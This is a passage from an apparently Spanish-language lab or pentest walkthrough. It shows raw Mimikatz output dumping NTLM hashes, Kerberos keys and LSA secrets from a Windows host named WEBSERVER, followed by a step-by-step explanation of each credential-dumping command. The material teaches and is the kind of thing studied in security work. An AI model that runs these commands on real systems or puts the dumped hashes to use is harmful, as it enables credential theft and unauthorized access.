          aes256_hmac       (4096) : 27d1fe245f22752ae07fa19e6c4cb8c9a711d23fa43041c3eba9dea1c46879f4
          aes128_hmac       (4096) : 2881481a8717f3d3a4377847a1099566
          des_cbc_md5       (4096) : 76315edf8a0191ea
        OlderCredentials
          aes256_hmac       (4096) : 7e16bff797907f940783a6315b3ab4bd398542aabf2bc888506bce52b0961cf4
          aes128_hmac       (4096) : e87a3a66df7112bf158fd184ffa88547
          des_cbc_md5       (4096) : 4a43754f1c08dca7

    * Packages *
        NTLM-Strong-NTOWF

    * Primary:Kerberos *
        Default Salt : EC2AMAZ-N0S1NB6Administrator
        Credentials
          des_cbc_md5       : 264a2c3df40ba886
        OldCredentials
          des_cbc_md5       : 76315edf8a0191ea


    RID  : 000001f5 (501)
    User : Guest

    RID  : 000001f7 (503)
    User : DefaultAccount

    RID  : 000001f8 (504)
    User : WDAGUtilityAccount
      Hash NTLM: d7da45674bae3a0476c0f64b67121f7d

    Supplemental Credentials:
    * Primary:NTLM-Strong-NTOWF *
        Random Value : be9923d30a0cdf3a73493d7d32eb96e4

    * Primary:Kerberos-Newer-Keys *
        Default Salt : WDAGUtilityAccount
        Default Iterations : 4096
        Credentials
          aes256_hmac       (4096) : c5a174bdaaf42f78aea168d2bb0736459de5ad0b5051997187d8b86f7af8ee69
          aes128_hmac       (4096) : 17456060abe8c50bc7ec5474e44d0ae4
          des_cbc_md5       (4096) : 5e435ecec4efbfdc

    * Packages *
        NTLM-Strong-NTOWF

    * Primary:Kerberos *
        Default Salt : WDAGUtilityAccount
        Credentials
          des_cbc_md5       : 5e435ecec4efbfdc


    mimikatz(commandline) # lsadump::secrets
    Domain : WEBSERVER
    SysKey : ea7b3f466f263386e6dc165bcde0d1d2

    Local name : WEBSERVER ( S-1-5-21-35825707-945739770-2891244367 )
    Domain name : SPARTANCYBERSEC ( S-1-5-21-1861162130-2580302541-221646211 )
    Domain FQDN : spartancybersec.corp

    Policy subsystem is : 1.18
    LSA Key(s) : 1, default {140c9bf8-da47-a27f-96d7-2b5527fd404e}
      [00] {140c9bf8-da47-a27f-96d7-2b5527fd404e} d51da8d90b5e95219f57070b04e71dfb6e95fc27241437fc8ef876b3c2ff43a6

    Secret  : $MACHINE.ACC
    cur/hex : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
        NTLM:449c5f226aff8a2af42ac07ebaf901cb
        SHA1:8af38efaf6e0c5c701c5d793438fbcdf4815777a
    old/hex : de ce 87 d1 ac 7b 8a ff c5 3b db 11 1d bd 9f 81 ca 32 f1 c5 cc 3f 89 cc 95 80 7a 97 1c 5d 2d 8b 28 af 7d 25 1a 53 7e b9 5c b9 2a 23 6a fb ca bb 9e 20 16 d4 3c f6 7e b4 b4 76 48 c6 b7 10 25 9a 07 b5 07 b2 7f d2 b1 b0 a1 b0 f9 ce a1 92 a7 26 3d 0d ff ca d8 16 5b 60 9d 20 64 ea d9 0b f5 5a c0 0f 79 1f a0 b4 e3 43 cd 63 d1 ec 14 f8 5d bb 4c e0 22 da 1e 83 6f 1a eb 39 82 cd 45 97 23 ea a4 ef d0 52 72 96 cb a1 f5 1c 07 ea ef cb 45 17 7b 5a f0 0b 8b 57 bb 8f 1e 35 2f f3 55 57 61 5b 4f 12 2f 51 11 c2 1b 60 59 39 c6 df 0c 06 9b 11 db 70 92 9e 90 6b 6c 49 f8 f7 d4 af 4c 86 21 87 e4 ea 57 50 a6 b7 87 ad 4d 61 c5 b0 35 84 79 c6 9d 26 8f a7 0f e7 3a e3 fb 34 24 88 27 fd c5 ae d5 61 67 1e eb 78 a7 05 dc 38 9a 9c 72 0a 44 cc
        NTLM:7d0c4cdc32724b99ef4459147401471a
        SHA1:cd54e4ac32cca2e2ad07df657a832d9ee1cabe04

    Secret  : DPAPI_SYSTEM
    cur/hex : 01 00 00 00 91 be 0d 0d 7a 07 12 fc 89 cd eb f3 39 1e 99 37 6b 34 ac d1 b5 b9 27 6f 74 f7 bb 7f 9b 8c 21 e6 39 98 83 e7 19 c4 ef f4
        full: 91be0d0d7a0712fc89cdebf3391e99376b34acd1b5b9276f74f7bb7f9b8c21e6399883e719c4eff4
        m/u : 91be0d0d7a0712fc89cdebf3391e99376b34acd1 / b5b9276f74f7bb7f9b8c21e6399883e719c4eff4
    old/hex : 01 00 00 00 3f 58 17 78 dc 26 36 52 37 eb 61 20 87 07 4c 73 40 d8 73 7d 36 32 97 aa 29 58 8c 35 f7 07 26 34 80 42 33 16 9f 13 c7 b9
        full: 3f581778dc26365237eb612087074c7340d8737d363297aa29588c35f7072634804233169f13c7b9
        m/u : 3f581778dc26365237eb612087074c7340d8737d / 363297aa29588c35f7072634804233169f13c7b9

    Secret  : NL$KM
    cur/hex : b6 96 c7 7e 17 8a 0c dd 8c 39 c2 0a a2 91 24 44 a2 e4 4d c2 09 59 46 c0 7f 95 ea 11 cb 7f cb 72 ec 2e 5a 06 01 1b 26 fe 6d a7 88 0f a5 e7 1f a5 96 cd e5 3f a0 06 5e c1 a5 01 a1 ce 8c 24 76 95
    old/hex : b6 96 c7 7e 17 8a 0c dd 8c 39 c2 0a a2 91 24 44 a2 e4 4d c2 09 59 46 c0 7f 95 ea 11 cb 7f cb 72 ec 2e 5a 06 01 1b 26 fe 6d a7 88 0f a5 e7 1f a5 96 cd e5 3f a0 06 5e c1 a5 01 a1 ce 8c 24 76 95

    mimikatz(commandline) # exit
    Bye!
    ```

    Vamos a desglosar cada parte del comando para entender mejor los procesos y tecnologías involucrados:

    1. **.\mimikatz.exe**: Este es el comando para ejecutar Mimikatz. `.\` indica que Mimikatz se ejecuta desde el directorio actual en la línea de comandos de Windows.
    2. **'privilege::debug'**: Este comando en Mimikatz solicita privilegios de depuración para el proceso Mimikatz. Los privilegios de depuración son necesarios para acceder a ciertas áreas de la memoria del sistema operativo y realizar operaciones que normalmente están restringidas.
    3. **'token::elevate'**: Este comando intenta elevar los privilegios de Mimikatz. En el contexto de Mimikatz, esto generalmente significa obtener un token de seguridad de un proceso con privilegios más altos, permitiendo que Mimikatz opere con esos privilegios elevados.
    4. **'sekurlsa::logonpasswords'**: Este comando extrae las contraseñas y otros datos de autenticación de la memoria del sistema, específicamente desde la seguridad de Kerberos, SSP, msv1\_0, entre otros. Utiliza el módulo sekurlsa de Mimikatz para acceder a la información almacenada por el proceso LSASS (Local Security Authority Subsystem Service).
    5. **'lsadump::sam'**: Este comando extrae las credenciales almacenadas en la base de datos SAM (Security Accounts Manager). La SAM contiene las credenciales de todos los usuarios locales del sistema y se utiliza generalmente para obtener hashes de contraseñas de cuentas locales.
    6. **'lsadump::secrets'**: Este comando se utiliza para extraer "secretos" almacenados por el sistema, como claves de acceso y otros datos sensibles, que pueden estar almacenados en el registro o en el servicio LSASS.
